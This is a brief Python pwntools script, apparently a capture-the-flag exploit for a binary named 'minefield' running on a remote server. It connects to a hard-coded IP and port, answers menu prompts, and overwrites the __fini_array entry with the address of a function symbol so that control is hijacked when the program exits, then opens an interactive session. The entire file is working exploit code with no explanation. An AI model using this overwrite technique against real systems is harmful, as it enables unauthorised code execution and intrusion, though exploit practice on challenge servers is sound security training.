from pwn import *

p = remote("138.68.168.137", 32479)
elf = ELF("minefield")


# overwrite __fini_array
p.sendlineafter("> ", "2")
pause()
p.sendlineafter(": ", str(6295672))
p.sendlineafter(": ", str(elf.symbols['_']))

p.interactive()